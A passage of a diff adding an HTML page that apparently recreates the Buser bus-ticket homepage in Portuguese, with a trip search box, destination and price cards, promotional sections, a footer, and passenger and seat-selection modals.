15.5599C92.5598 16.123 93.0943 16.9085 93.2827 17.9301C93.4429 18.7971 93.3972 19.6546 93.105 20.489C92.8304 21.2745 92.3444 21.9081 91.7062 22.4277C90.9604 23.0356 90.1028 23.3978 89.1779 23.6176C88.1979 23.851 87.203 23.9012 86.2 23.8944C84.6666 23.8822 83.1735 23.6203 81.7115 23.1699C80.9845 22.946 80.2723 22.6747 79.6086 22.2921C79.3945 22.1686 79.202 22.018 79.0149 21.8308C79.5399 20.8906 80.065 19.9517 80.5981 18.9979C80.6627 19.044 80.7193 19.0793 80.7704 19.1214C81.0491 19.3507 81.3682 19.5067 81.7007 19.6396C82.5744 19.9883 83.4711 20.2624 84.4 20.4171C85.4218 20.5866 86.4477 20.6436 87.4776 20.508C87.8801 20.455 88.2732 20.356 88.6408 20.1742C88.8858 20.0534 89.0877 19.8866 89.1577 19.6057C89.2237 19.3398 89.2089 19.0779 89.0958 18.827C89.0312 18.6831 88.9275 18.5746 88.7916 18.4905C88.4281 18.2653 88.0255 18.1581 87.6122 18.0957C87.0306 18.0061 86.445 17.9437 85.8621 17.8691C85.0543 17.766 84.2371 17.7185 83.4401 17.5353C82.6593 17.3562 81.9094 17.0917 81.2201 16.6711C80.4716 16.2139 79.9506 15.5613 79.6544 14.7418C79.2168 13.5316 79.2626 12.3214 79.7917 11.1505C80.209 10.2266 80.9253 9.57942 81.8125 9.12084C82.4681 8.78166 83.1695 8.58764 83.8898 8.45468C84.9708 8.25524 86.06 8.24032 87.1531 8.29187C87.8707 8.32579 88.5842 8.39363 89.2897 8.53066C89.9965 8.66905 90.6831 8.8712 91.3185 9.22395C91.5999 9.37998 91.8597 9.56449 92.0792 9.80192C92.6042 10.3677 92.7173 11.1342 92.3821 11.8302C92.2098 12.1871 91.962 12.4815 91.6632 12.7352C91.4895 12.8844 91.2835 12.9753 91.0789 13.035Z" fill="currentColor"></path></svg>
+      </a>
+      <div class="menu-links">
+        <a href="/" class="ml-item">Início</a>
+        <a href="/promo" class="ml-item">Promoções</a>
+        <a href="/experiencias" class="ml-item">Experiências ✨</a>
+        <a href="/perfil/viagens" class="ml-item">Viagens</a>
+        <a href="/ajuda" class="ml-item">Ajuda</a>
+        <div class="avatar" title="Minha conta"></div>
+      </div>
+    </div>
+  </div>
+</nav>
+
+<header class="header">
+  <div class="h-container">
+    <span class="hc-background-brand" aria-hidden="true"></span>
+    
+    <!-- IMAGEM DO BANNER (ACIMA DO ORIGEM) -->
+    <div class="hc-video" aria-hidden="true">
+      <img src="https://images.bcdn.com.br/pItLwwNuUe3zU_I4iGqvV6UEeHU=/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/11/02/25/hero_desktop_home.png" alt="Banner Buser">
+    </div>
+
+    <div class="container searchbox-wrapper">
+      <div class="searchbox-card">
+        <div class="searchbox-field">
+          <label for="input-origem">Origem</label>
+          <input type="text" id="input-origem" placeholder="Cidade de origem" autocomplete="off">
+          <ul id="lista-origem" class="autocomplete-dropdown"></ul>
+        </div>
+        
+        <button class="swap-btn" type="button" onclick="swapCidades()" title="Trocar origem e destino">⇅</button>
+
+        <div class="searchbox-field">
+          <label for="input-destino">Destino</label>
+          <input type="text" id="input-destino" placeholder="Cidade de destino" autocomplete="off">
+          <ul id="lista-destino" class="autocomplete-dropdown"></ul>
+        </div>
+        
+        <div class="searchbox-field">
+          <label for="input-ida">Data de ida</label>
+          <input type="text" id="input-ida" placeholder="Selecione a data" readonly>
+        </div>
+        
+        <div class="searchbox-field">
+          <label for="input-volta">Data de volta <span style="font-weight:400; font-size:10px;">(Opcional)</span></label>
+          <input type="text" id="input-volta" placeholder="Selecione a data" readonly>
+        </div>
+        
+        <button class="searchbox-btn" id="btn-pesquisar" aria-label="Pesquisar">🔍</button>
+      </div>
+    </div>
+
+    <div class="hcb-vantagens">
+      <span>✓ Parcelamento em até 12x</span>
+      <span>✓ Cancelamento fácil</span>
+      <span>✓ Embarque com QR Code</span>
+    </div>
+  </div>
+</header>
+
+<div class="container" id="resultados-viagem">
+  <h2 id="titulo-resultados">Resultados da busca</h2>
+  
+  <div class="resultados-layout">
+    <aside class="filtros-sidebar" id="filtros-sidebar" style="display:none;">
+      <div class="filtro-grupo">
+        <h3>Viação</h3>
+        <div id="filtro-empresas"></div>
+      </div>
+      <div class="filtro-grupo">
+        <h3>Tipo de assento</h3>
+        <div id="filtro-tipos"></div>
+      </div>
+    </aside>
+
+    <div id="lista-viagens" style="flex: 1;"></div>
+  </div>
+</div>
+
+<div class="container cupons-carrossel">
+  <section class="carousel">
+    <ul>
+      <li><img src="https://images.bcdn.com.br/FzOFcZ_a_eD5HV1Ck4LueOR3dgg=/1920x299/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/11/02/25/hero_desktop_home.png" class="cupom-img" alt="Cupom 1"></li>
+      <li><img src="https://images.bcdn.com.br/S9WY1kN5pYGibytsnJo2RadAmzo=/480x240/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/11/02/23/banner_black_friday.png" class="cupom-img" alt="Cupom 2"></li>
+      <li><img src="https://images.bcdn.com.br/-_h9-QlSqW6HfACE0JvTbhZocnQ=/360x180/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/09/08/23/banners-set-01.png" class="cupom-img" alt="Cupom 3"></li>
+    </ul>
+  </section>
+</div>
+
+<div class="container">
+  <div class="secao-destinos">
+    <section class="sdb-section">
+      <div class="sdbc-header">
+        <h2>Para onde vamos?</h2>
+        <div class="categories" id="categorias-filtro">
+          <button class="cat-pill active" onclick="ativarFiltro(this)">🌴 Praias</button>
+          <button class="cat-pill" onclick="ativarFiltro(this)">🏙️ Capitais</button>
+          <button class="cat-pill" onclick="ativarFiltro(this)">🏔️ Serras</button>
+          <button class="cat-pill" onclick="ativarFiltro(this)">🎢 Parques</button>
+        </div>
+      </div>
+
+      <div class="section-destinations">
+        <div class="cd-multi-cards">
+          <div class="dest-card" onclick="preencherBusca('São Paulo, SP')">
+            <img src="https://images.bcdn.com.br/0gQ881-J5SiCq763cDlww-fmxdU=/360x56/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/11/02/25/hero_desktop_home.png" alt="São Paulo">
+            <div class="info"><h3>São Paulo</h3><p>A partir de R$ 19,90</p></div>
+          </div>
+          <div class="dest-card" onclick="preencherBusca('Rio de Janeiro, RJ')">
+            <img src="https://images.bcdn.com.br/CqR7qnxuRfN2X7Uye-Eh2XP__44=/480x240/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/09/08/23/banners-set-01.png" alt="Rio de Janeiro">
+            <div class="info"><h3>Rio de Janeiro</h3><p>A partir de R$ 88,02</p></div>
+          </div>
+          <div class="dest-card" onclick="preencherBusca('Belo Horizonte, MG')">
+            <img src="https://images.bcdn.com.br/OsNOVwLr7D8wucjpAxxKysHiLvc=/360x180/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/09/08/23/banners-set-03.png" alt="Belo Horizonte">
+            <div class="info"><h3>Belo Horizonte</h3><p>A partir de R$ 62,90</p></div>
+          </div>
+          <div class="dest-card" onclick="preencherBusca('Campinas, SP')">
+            <img src="https://images.bcdn.com.br/1IFiDUQwNFOeBumQZ5YyiRVNWN8=/360x180/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/09/08/23/banners-set-02.png" alt="Campinas">
+            <div class="info"><h3>Campinas</h3><p>A partir de R$ 20,90</p></div>
+          </div>
+        </div>
+        <div class="cd-destaque" onclick="preencherBusca('Salvador, BA')">
+          <img src="https://images.bcdn.com.br/pItLwwNuUe3zU_I4iGqvV6UEeHU=/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/11/02/25/hero_desktop_home.png" alt="Destaque">
+        </div>
+      </div>
+    </section>
+
+    <div class="sdb-button">
+      <a href="#" class="btn-outline">Ver mais destinos →</a>
+    </div>
+  </div>
+</div>
+
+<div class="container valores-buser">
+  <div class="vb-head"><p>Aqui é sem letras miúdas.</p><h2>É só você vivendo o seu caminho.</h2></div>
+  <div class="vb-cards">
+    <div class="vb-card"><div class="icon-circle">🛡️</div><h3>Mais seguro</h3><p>Empresas e motoristas treinados e certificados pela ANTT. Ônibus com tecnologias exclusivas, como câmeras de fadiga e telemetria.</p></div>
+    <div class="vb-card"><div class="icon-circle">✌️</div><h3>Prático como deve ser</h3><p>Viajar com a praticidade de comprar pelo app, sem pegar filas. No Fretamento, dá até pra acompanhar o embarque em tempo real.</p></div>
+    <div class="vb-card"><div class="icon-circle">💰</div><h3>Barato e com qualidade</h3><p>Viagens de ônibus por até menos da metade do preço das passagens de rodoviária. Diversas opções de destino com qualidade e preço justo!</p></div>
+  </div>
+</div>
+
+<div class="container midia-section">
+  <div class="ms-content"><p>Na mídia</p><h2>Veja o que falam sobre a Buser</h2><p>Viajar de Buser é escolher o caminho certo. E não é a gente quem tá falando.</p><a href="#">Ver todas as notícias</a></div>
+  <div class="ms-items">
+    <div class="ms-item"><h3>Buser lança rota que vai da capital paulista ao parque de diversões Hopi Hari</h3><div><img src="https://d1q5r6jf4yxfe1.cloudfront.net/public/Imagem/2026/01/13/folha-de-saopaulo.png" alt="Folha de S.Paulo"><p>17 de julho de 2025</p></div></div>
+    <div class="ms-item"><h3>Buser investe em praticidade e segurança para ajudar os brasileiros a viajar mais</h3><div><img src="https://d1q5r6jf4yxfe1.cloudfront.net/public/Imagem/2026/01/13/estadao.png" alt="Estadão"><p>21 de maio de 2025</p></div></div>
+  </div>
+  <div class="ms-background"><img src="https://bcdn.com.br/_nuxt3/poltronas.fWv4A4-_.webp" alt="Interior de um ônibus"></div>
+</div>
+
+<div class="container banners-home">
+  <div class="bh-promo"><div><h1>Viagens de ônibus mais baratas que a passagem da rodoviária</h1><p>Confira aqui nossas promoções e rotas com menores preços.</p></div><a href="#" class="btn-outline" style="background: var(--brand); color: #fff; border: none;">QUERO PROMO →</a></div>
+  <div class="bh-card"><div><h2 style="color: #40b552;">Compre pelo Whatsapp</h2><p>Encontre a viagem ideal para você.</p><a href="#" style="color: #40b552; font-weight: 600;">Reserve agora</a></div><img src="https://bcdn.com.br/_nuxt3/whatsapp.CVlL74hz.jpg" alt="WhatsApp" class="img-whats"></div>
+  <div class="bh-card"><div><h2 style="color: var(--brand);">Baixe o app da Buser</h2><p>É do app para a poltrona do ônibus: Sem burocracia e com segurança!</p></div><div class="stores"><img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="App Store"></div></div>
+</div>
+
+<div class="container destinos-procurados">
+  <h2>Destinos mais procurados</h2>
+  <section class="carousel dp-carousel">
+    <ul>
+      <li><div class="dp-card"><h3>Ônibus para São Paulo</h3><div class="dp-row"><a href="#">Saindo do Rio de Janeiro</a><span>R$ 93,90</span></div><div class="dp-row"><a href="#">Saindo de Belo Horizonte</a><span>R$ 100,75</span></div><div class="dp-row"><a href="#">Saindo de Ribeirão Preto</a><span>R$ 65,90</span></div><div class="dp-row"><a href="#">Saindo de Campinas</a><span>R$ 19,90</span></div><a href="#" class="ver-mais">Ver mais ônibus</a></div></li>
+      <li><div class="dp-card"><h3>Ônibus para Rio de Janeiro</h3><div class="dp-row"><a href="#">Saindo de São Paulo</a><span>R$ 88,02</span></div><div class="dp-row"><a href="#">Saindo de Belo Horizonte</a><span>R$ 62,90</span></div><div class="dp-row"><a href="#">Saindo de Vitória</a><span>R$ 80,90</span></div><div class="dp-row"><a href="#">Saindo de Campinas</a><span>R$ 70,90</span></div><a href="#" class="ver-mais">Ver mais ônibus</a></div></li>
+      <li><div class="dp-card"><h3>Ônibus para Belo Horizonte</h3><div class="dp-row"><a href="#">Saindo do Rio de Janeiro</a><span>R$ 62,90</span></div><div class="dp-row"><a href="#">Saindo de São Paulo</a><span>R$ 82,90</span></div><div class="dp-row"><a href="#">Saindo de Montes Claros</a><span>R$ 66,90</span></div><div class="dp-row"><a href="#">Saindo de Ipatinga</a><span>R$ 52,90</span></div><a href="#" class="ver-mais">Ver mais ônibus</a></div></li>
+    </ul>
+  </section>
+</div>
+
+<div class="container sobre-buser">
+  <div class="ac-titulo"><p>Viaje com praticidade, segurança e preço justo.</p><h2>Buser é tudo o que você precisa para viajar de ônibus</h2></div>
+  <div class="sobre-container"><img src="https://bcdn.com.br/_nuxt3/foto-busao-rosa.B2KzL8f9.png" alt="Passageiro embarcando no ônibus da Buser"><button class="sci-btn" aria-label="Ver vídeo" onclick="alert('Aqui abriria o player de vídeo institucional da Buser!')">▶</button></div>
+  <div class="mpv-motivos">
+    <div class="mpv-item"><span class="icon">✌️</span><h3>Viaje do seu jeito</h3><p>Aqui quem faz o seu caminho, é você. Escolhe onde embarcar, onde desembarcar e até pra cancelar é você quem manda.</p></div>
+    <div class="mpv-item"><span class="icon">⏱️</span><h3>Cancelamento gratuito</h3><p>No seu caminho, você que manda. O Fretamento Buser tem cancelamento gratuito até 1h antes do embarque e nas rodoviárias, até 72h antes.</p></div>
+    <div class="mpv-item"><span class="icon">🎧</span><h3>Suporte 24 horas por dia</h3><p>Antes, durante e após a viagem. Nossos clientes contam com um time de atendimento disponível 24h por dia, todos os dias inclusive nos feriados.</p></div>
+  </div>
+</div>
+
+<div class="container" style="padding-inline:0">
+  <div class="seguranca-section">
+    <div class="ss-container">
+      <div class="ssc-image"><img src="https://bcdn.com.br/_nuxt3/banner-seguranca.L6_9exp4.webp" alt="Segurança"></div>
+      <div class="ssc-content"><h2>Segurança pra você trilhar o seu caminho</h2><p>Os parceiros da Buser têm câmera anti-fadiga com reconhecimento facial e acompanhamento por telemetria. Aqui o atendimento é 24h, sempre que você precisar.</p><a href="#" class="btn-white">Viaje com a Buser →</a></div>
+    </div>
+  </div>
+</div>
+
+<footer class="footer">
+  <div class="container">
+    <section class="f-social-brand">
+      <svg class="logo" viewBox="0 0 122 24" style="color: var(--brand); fill: var(--brand);" xmlns="http://www.w3.org/2000/svg"><path d="M15.6299 11.9915C14.6646 10.4937 13.7047 9.0067 12.7394 7.51022C12.765 7.48173 12.7892 7.45324 12.8162 7.42746C13.4153 6.84813 14.0817 6.36242 14.8127 5.9649C15.6353 5.51717 16.505 5.19834 17.4204 5.00975C17.9482 4.90121 18.4813 4.83745 19.0198 4.82523C21.3529 4.77368 23.4423 5.46833 25.2571 6.94717C26.8901 8.27678 27.9537 9.98627 28.4814 12.0336C28.6039 12.5071 28.6807 12.9887 28.7265 13.4772C28.7776 14.0253 28.7843 14.5734 28.7386 15.1202C28.5757 17.0549 27.9106 18.7956 26.7084 20.3165C25.4281 21.9351 23.7883 23.0177 21.8133 23.5808C21.3219 23.7205 20.8225 23.8128 20.3149 23.8671C19.7683 23.9268 19.2218 23.9417 18.6738 23.9023C17.1189 23.7897 15.6703 23.3312 14.3415 22.5063C13.1164 21.7465 12.1228 20.7479 11.3393 19.5323C9.38451 16.4959 7.42703 13.4609 5.47089 10.4245C4.11519 8.32698 2.76219 6.22539 1.40649 4.12516C1.1655 3.75205 1.00934 3.3491 0.974333 2.90409C0.921828 2.22572 1.0955 1.60976 1.50746 1.06707C1.91269 0.533871 2.44985 0.20554 3.10683 0.122779C4.19193 -0.0128944 5.0697 0.372419 5.67687 1.29364C6.4806 2.50793 7.25471 3.73849 8.04228 4.95955C9.92706 7.88332 11.8145 10.8071 13.7007 13.7295C14.3509 14.7376 15.0012 15.7443 15.6555 16.7496C16.3259 17.7821 17.2602 18.4469 18.4598 18.6857C19.9393 18.9801 21.2425 18.5853 22.3411 17.5447C23.0209 16.9002 23.4369 16.0984 23.6052 15.1744C24.0293 12.8517 22.5969 10.6646 20.3863 10.1043C19.9016 9.98084 19.4089 9.932 18.9121 9.98627C17.5524 10.1355 16.4753 10.7745 15.6918 11.9088C15.6797 11.9264 15.6689 11.944 15.6568 11.9603C15.6514 11.9671 15.6474 11.9712 15.6299 11.9915Z" fill="currentColor"></path><path d="M29.067 7.27818C29.0859 7.24562 29.0993 7.2212 29.1155 7.19813C30.3864 5.22272 31.6559 3.2446 32.9295 1.27055C33.3603 0.601673 33.9769 0.210933 34.7577 0.101037C35.859 -0.0549881 36.9104 0.522983 37.3789 1.54732C37.7734 2.41021 37.7236 3.26088 37.2147 4.06543C36.5631 5.09655 35.8967 6.11953 35.237 7.14522C33.9473 9.15048 32.6575 11.1557 31.3665 13.161C31.3463 13.1922 31.3247 13.2234 31.287 13.2763C31.0784 11.0621 30.3366 9.07315 29.067 7.27818Z" fill="currentColor"></path><path d="M52.7732 23.9215C52.5981 23.8971 52.4231 23.8713 52.2481 23.8496C51.4148 23.7438 50.6151 23.5213 49.8585 23.1495C49.3657 22.908 48.9013 22.6218 48.461 22.2948C47.5483 21.6164 46.9088 20.725 46.4443 19.6939C46.0714 18.8649 45.8493 17.9953 45.7429 17.093C45.6675 16.4595 45.6406 15.8245 45.6406 15.1868C45.6406 11.5264 45.6392 7.86587 45.6433 4.20539C45.6433 3.95439 45.6702 3.69797 45.7173 3.45104C45.786 3.09422 45.9785 2.80524 46.2693 2.58002C46.7647 2.19606 47.3342 2.09973 47.9373 2.12415C48.4207 2.14315 48.8824 2.2639 49.3321 2.43213C49.3496 2.43892 49.3671 2.44434 49.3846 2.45113C49.6552 2.56374 49.6552 2.56374 49.6565 2.85408C49.6606 6.59461 49.6646 10.3365 49.6687 14.077C49.6687 14.6143 49.6579 15.1529 49.6565 15.6902C49.6552 16.2546 49.7279 16.8108 49.8612 17.3603C50.0348 18.074 50.4172 18.6587 50.9355 19.1621C50.9395 19.1661 50.9449 19.1702 50.949 19.1743C51.7904 20.0073 52.823 20.2705 53.9592 20.1471C55.5963 19.9693 56.878 18.7618 57.193 17.1229C57.3855 16.1243 57.3357 15.1339 56.9412 14.191C56.4391 12.993 55.5169 12.2821 54.2662 12.0107C53.6267 11.8723 52.9845 11.8995 52.3545 12.0799C51.8698 12.2183 51.4323 12.4476 51.0526 12.784C51.0176 12.8153 50.9786 12.8424 50.9207 12.8872C50.9166 12.8044 50.9126 12.7447 50.9126 12.685C50.9126 11.5101 50.9153 10.3351 50.9086 9.1602C50.9072 9.01367 50.9517 8.94312 51.0849 8.88342C51.8792 8.52931 52.7085 8.33259 53.5769 8.29867C54.6243 8.25932 55.6515 8.37465 56.6289 8.76403C58.6537 9.56993 60.0713 10.9999 60.8683 13.0432C61.3287 14.2249 61.4782 15.4555 61.3987 16.7186C61.3368 17.7104 61.116 18.6601 60.7027 19.5623C59.9973 21.1022 58.8704 22.2324 57.3922 23.0206C56.4687 23.5131 55.4832 23.7886 54.4452 23.8849C54.3914 23.8903 54.3389 23.9079 54.285 23.9202C53.7802 23.9215 53.2767 23.9215 52.7732 23.9215Z" fill="currentColor"></path><path d="M69.6716 23.9214C69.5019 23.8984 69.3336 23.8699 69.164 23.8522C68.5205 23.7844 67.8918 23.6433 67.286 23.4221C65.1871 22.6569 63.8583 21.189 63.3589 18.9856C63.2323 18.4293 63.2108 17.8595 63.2108 17.2897C63.2108 14.9832 63.196 12.6768 63.2202 10.3717C63.2269 9.7313 63.5097 9.19403 64.1303 8.89962C64.4817 8.73274 64.8532 8.66626 65.2369 8.66083C65.8926 8.65133 66.5132 8.79922 67.1029 9.08549C67.1244 9.09634 67.1459 9.10855 67.1675 9.12077C67.1769 9.12755 67.185 9.13569 67.2079 9.15604C67.2079 9.22388 67.2079 9.30393 67.2079 9.38397C67.2079 11.8139 67.2079 14.2438 67.2079 16.6737C67.2079 17.2259 67.2536 17.7727 67.4192 18.3032C67.4529 18.409 67.4906 18.5135 67.531 18.6166C67.8312 19.3587 68.3697 19.8417 69.133 20.0534C69.9287 20.2745 70.7338 20.2813 71.5348 20.0846C72.4395 19.8634 73.0157 19.276 73.3159 18.4009C73.4559 17.9952 73.5219 17.5746 73.5421 17.1472C73.5515 16.9437 73.5515 16.7389 73.5515 16.5353C73.5515 14.5884 73.5502 12.6401 73.5542 10.6932C73.5542 10.4897 73.569 10.2848 73.6054 10.0854C73.7306 9.41382 74.1371 8.99187 74.7793 8.78972C75.1482 8.67304 75.5279 8.65676 75.9088 8.67983C76.4272 8.71103 76.9239 8.84128 77.4046 9.03936C77.5351 9.09363 77.5836 9.16689 77.5823 9.31614C77.5769 12.0242 77.5796 14.7322 77.5769 17.4403C77.5755 18.3005 77.4301 19.1362 77.134 19.9448C76.6224 21.3409 75.6827 22.3463 74.3862 23.0314C73.6229 23.4344 72.8084 23.6745 71.9616 23.8075C71.726 23.8441 71.4863 23.8617 71.2494 23.8902C71.2023 23.8956 71.1551 23.9119 71.108 23.9241C70.6288 23.9214 70.1508 23.9214 69.6716 23.9214Z" fill="currentColor"></path><path d="M121.031 10.8997C121.017 10.9458 121.004 10.9919 120.993 11.0394C120.953 11.1995 120.937 11.3718 120.869 11.5197C120.666 11.9688 120.395 12.3704 119.981 12.6743C119.92 12.6499 119.853 12.6227 119.788 12.5929C119.186 12.3202 118.567 12.1126 117.91 12.0258C117.377 11.9566 116.845 11.9471 116.317 12.0529C115.313 12.2523 114.709 12.8669 114.478 13.8655C114.384 14.278 114.361 14.6958 114.361 15.1178C114.363 17.838 114.363 20.6288 114.363 23.3478C114.363 23.4278 114.363 23.5065 114.363 23.5825C114.217 23.6232 110.686 23.6367 110.37 23.6001C110.366 23.5499 110.357 23.497 110.357 23.4441C110.357 20.31 110.355 17.1054 110.36 13.9713C110.362 13.0257 110.535 12.114 110.962 11.2646C111.579 10.0341 112.561 9.22139 113.835 8.75196C114.763 8.4087 115.725 8.29067 116.708 8.29338C117.489 8.29474 118.264 8.35036 119.021 8.56473C119.411 8.67598 119.789 8.81844 120.135 9.03823C120.557 9.30686 120.85 9.67454 120.973 10.167C121 10.2742 121.015 10.3828 121.035 10.4913C121.031 10.627 121.031 10.7626 121.031 10.8997Z" fill="currentColor"></path><path d="M98.9142 18.0644C98.9424 18.1472 98.9613 18.2177 98.9909 18.2828C99.3598 19.1023 99.9818 19.6518 100.798 19.9883C101.285 20.189 101.799 20.28 102.32 20.3179C103.276 20.3885 104.218 20.3166 105.141 20.0303C105.559 19.9001 105.944 19.6979 106.336 19.5053C106.533 19.4076 106.732 19.314 106.947 19.2095C107.464 20.2013 107.973 21.1795 108.486 22.1645C108.454 22.193 108.431 22.2214 108.401 22.2404C107.771 22.6624 107.116 23.0382 106.389 23.2648C105.58 23.5171 104.76 23.722 103.914 23.8129C103.174 23.8929 102.433 23.9269 101.692 23.8753C100.318 23.7803 99.0178 23.433 97.8506 22.6719C96.3455 21.691 95.3438 20.3207 94.8713 18.58C94.4014 16.8501 94.4216 15.1121 94.9898 13.4094C95.6858 11.3228 97.0671 9.8412 99.0609 8.9444C100.025 8.51024 101.04 8.29859 102.094 8.26332C103.093 8.23076 104.083 8.29995 105.041 8.60522C106.075 8.9349 107.004 9.44775 107.734 10.2767C108.475 11.1206 108.854 12.107 108.84 13.2412C108.834 13.7703 108.77 14.2872 108.622 14.796C108.443 15.4133 108.105 15.9248 107.635 16.3535C107.102 16.8393 106.472 17.1513 105.798 17.3806C105.04 17.637 104.262 17.8039 103.47 17.9097C102.257 18.0725 101.037 18.097 99.8148 18.082C99.5698 18.0793 99.3248 18.0644 99.0798 18.0563C99.0313 18.0563 98.9842 18.0617 98.9142 18.0644ZM98.6637 15.0294C98.7472 15.0389 98.8011 15.0484 98.8549 15.0497C100.063 15.0646 101.27 15.1026 102.474 14.9466C103.073 14.8693 103.654 14.7309 104.202 14.4636C104.625 14.2574 104.886 13.9304 104.932 13.4488C104.986 12.902 104.858 12.4244 104.379 12.1042C104.113 11.9265 103.825 11.7868 103.513 11.7054C102.903 11.548 102.287 11.5222 101.671 11.6348C100.625 11.8275 99.7892 12.3471 99.2292 13.2792C98.968 13.7133 98.8065 14.1828 98.7149 14.678C98.6961 14.7879 98.6839 14.8964 98.6637 15.0294Z" fill="currentColor"></path><path d="M91.0789 13.035C90.8864 12.8817 90.7113 12.7257 90.5202 12.5954C90.0059 12.2441 89.427 12.0433 88.8293 11.8913C87.9515 11.6674 87.0616 11.5358 86.1555 11.5358C85.5847 11.5358 85.0153 11.567 84.4579 11.7122C84.1711 11.7868 83.8938 11.8872 83.6649 12.0853C83.3782 12.3336 83.2799 12.6484 83.358 13.0188C83.4159 13.2942 83.5922 13.476 83.8332 13.5981C84.1873 13.7772 84.5656 13.8844 84.9547 13.9413C85.6884 14.0485 86.4248 14.1435 87.1599 14.2425C88.0524 14.3633 88.9491 14.461 89.8174 14.7201C90.4798 14.9182 91.1098 15.1814 91.6928 15.5599C92.5598 16.123 93.0943 16.9085 93.2827 17.9301C93.4429 18.7971 93.3972 19.6546 93.105 20.489C92.8304 21.2745 92.3444 21.9081 91.7062 22.4277C90.9604 23.0356 90.1028 23.3978 89.1779 23.6176C88.1979 23.851 87.203 23.9012 86.2 23.8944C84.6666 23.8822 83.1735 23.6203 81.7115 23.1699C80.9845 22.946 80.2723 22.6747 79.6086 22.2921C79.3945 22.1686 79.202 22.018 79.0149 21.8308C79.5399 20.8906 80.065 19.9517 80.5981 18.9979C80.6627 19.044 80.7193 19.0793 80.7704 19.1214C81.0491 19.3507 81.3682 19.5067 81.7007 19.6396C82.5744 19.9883 83.4711 20.2624 84.4 20.4171C85.4218 20.5866 86.4477 20.6436 87.4776 20.508C87.8801 20.455 88.2732 20.356 88.6408 20.1742C88.8858 20.0534 89.0877 19.8866 89.1577 19.6057C89.2237 19.3398 89.2089 19.0779 89.0958 18.827C89.0312 18.6831 88.9275 18.5746 88.7916 18.4905C88.4281 18.2653 88.0255 18.1581 87.6122 18.0957C87.0306 18.0061 86.445 17.9437 85.8621 17.8691C85.0543 17.766 84.2371 17.7185 83.4401 17.5353C82.6593 17.3562 81.9094 17.0917 81.2201 16.6711C80.4716 16.2139 79.9506 15.5613 79.6544 14.7418C79.2168 13.5316 79.2626 12.3214 79.7917 11.1505C80.209 10.2266 80.9253 9.57942 81.8125 9.12084C82.4681 8.78166 83.1695 8.58764 83.8898 8.45468C84.9708 8.25524 86.06 8.24032 87.1531 8.29187C87.8707 8.32579 88.5842 8.39363 89.2897 8.53066C89.9965 8.66905 90.6831 8.8712 91.3185 9.22395C91.5999 9.37998 91.8597 9.56449 92.0792 9.80192C92.6042 10.3677 92.7173 11.1342 92.3821 11.8302C92.2098 12.1871 91.962 12.4815 91.6632 12.7352C91.4895 12.8844 91.2835 12.9753 91.0789 13.035Z" fill="currentColor"></path></svg>
+      <div class="fe-social"><span>📷</span><span>📘</span><span>🐦</span><span>💼</span><span>🎵</span></div>
+    </section>
+    <span class="ada-divider"></span>
+    <div class="f-links">
+      <div><span class="r-title">Destinos</span><a href="#" class="r-link">Rio de Janeiro → São Paulo</a><a href="#" class="r-link">São Paulo → Rio de Janeiro</a><a href="#" class="r-link">São Paulo → Belo Horizonte</a></div>
+      <div><span class="r-title">Viagem</span><a href="#" class="r-link">Buser Carro</a><a href="#" class="r-link">Empresas de ônibus</a></div>
+      <div><span class="r-title">Sobre a Buser</span><a href="#" class="r-link">Central de ajuda</a><a href="#" class="r-link">Imprensa</a></div>
+    </div>
+    <span class="ada-divider"></span>
+    <div class="fe-copyright">© 2026 Copyright - Todos os direitos reservados. Buser Brasil Tecnologia LTDA</div>
+  </div>
+</footer>
+
+<nav class="ada-nav-bottom">
+  <a href="#" class="nb-item active"><i>🏠</i> Início</a>
+  <a href="#" class="nb-item"><i>🎟️</i> Experiências</a>
+  <a href="#" class="nb-item"><i>🚌</i> Viagens</a>
+  <a href="#" class="nb-item"><i>❓</i> Ajuda</a>
+  <a href="#" class="nb-item"><i>👤</i> Perfil</a>
+</nav>
+
+<!-- MODAL DE PASSAGEIROS -->
+<div id="modal-passageiros" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:1002; align-items:center; justify-content:center;">
+  <div style="background:#fff; padding:24px; border-radius:16px; max-width:600px; width:100%; margin:16px; max-height:90vh; overflow-y:auto;">
+    <h2 style="color:var(--brand); margin-top:0;">Quem vai viajar?</h2>
+    <p style="font-size:14px; color:#666; margin-bottom:16px;">Adicione os dados dos passageiros:</p>
+    <div id="lista-passageiros"></div>
+    <button onclick="adicionarPassageiro()" style="width:100%; padding:12px; border:1px dashed var(--brand); background:transparent; color:var(--brand); border-radius:8px; cursor:pointer; margin-bottom:16px; font-weight:600;">+ Adicionar outro passageiro</button>
+    <div style="border-top:1px solid #eee; padding-top:16px; margin-top:16px;">
+      <p style="font-size:16px; font-weight:600;">Total: <span id="valor-total" style="color:var(--brand);">R$ 0,00</span></p>
+    </div>
+    <div style="display:flex; gap:8px; margin-top:16px;">
+      <button onclick="fecharModalPassageiros()" style="flex:1; padding:12px; border:1px solid #ddd; background:#fff; border-radius:8px; cursor:pointer;">Cancelar</button>
+      <button onclick="confirmarPassageiros()" style="flex:1; padding:12px; border:none; background:var(--brand); color:#fff; border-radius:8px; font-weight:700; cursor:pointer;">Continuar</button>
+    </div>
+  </div>
+</div>
+
+<!-- MODAL DE POLTRONA -->
+<div id="modal-poltrona" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:1001; align-items:center; justify-content:center;">
+  <div style="background:#fff; padding:24px; border-radius:16px; max-width:500px; width:100%; margin:16px; max-height:90vh; overflow-y:auto;">
+    <h2 style="color:var(--brand); margin-top:0;">Escolha sua Poltrona</h2>
